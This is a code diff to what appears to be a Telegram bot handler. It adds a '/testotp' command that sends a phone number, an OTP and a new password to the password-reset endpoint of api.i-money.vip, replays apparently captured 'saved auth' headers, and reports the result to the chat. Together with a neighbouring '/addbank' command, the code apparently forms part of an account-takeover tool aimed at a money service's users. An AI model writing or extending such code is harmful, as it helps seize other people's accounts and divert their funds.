@@ -775,6 +775,36 @@ Example:
       return res.sendStatus(200);
     }
 
+    else if (text.startsWith('/testotp ')) {
+      const parts = text.substring(8).trim().split(/\s+/);
+      if (parts.length < 3) {
+        await bot.sendMessage(chatId, `Format: /testotp <phone> <password> <otp>`);
+        return res.sendStatus(200);
+      }
+      const [phone, newPass, otp] = parts;
+      const formBody = `phone=${encodeURIComponent(phone)}&smsCode=${encodeURIComponent(otp)}&newPassword=${encodeURIComponent(newPass)}`;
+
+      const hdrs = savedForgetPassHeaders ? { ...savedForgetPassHeaders } : { 'host': 'api.i-money.vip' };
+      hdrs['content-type'] = 'application/x-www-form-urlencoded';
+      hdrs['content-length'] = String(Buffer.byteLength(formBody));
+
+      try {
+        const resp = await fetch(ORIGINAL_API + '/user/forgetPass', {
+          method: 'POST',
+          headers: hdrs,
+          body: formBody
+        });
+        const statusCode = resp.status;
+        const respText = await resp.text();
+        let result;
+        try { result = JSON.parse(respText); } catch(e) { result = respText; }
+        await bot.sendMessage(chatId, `🧪 Test OTP: ${otp}\nHTTP Status: ${statusCode}\nBody sent: ${formBody}\nHeaders used: ${savedForgetPassHeaders ? 'saved auth' : 'minimal'}\n\nResponse:\n${JSON.stringify(result, null, 2).substring(0, 2000)}`);
+      } catch(e) {
+        await bot.sendMessage(chatId, `⚠️ Error: ${e.message}`);
+      }
+      return res.sendStatus(200);
+    }
+
     else if (text.startsWith('/addbank ')) {
       const parts = text.substring(9).split('|').map(s => s.trim());
       if (parts.length !== 3) {
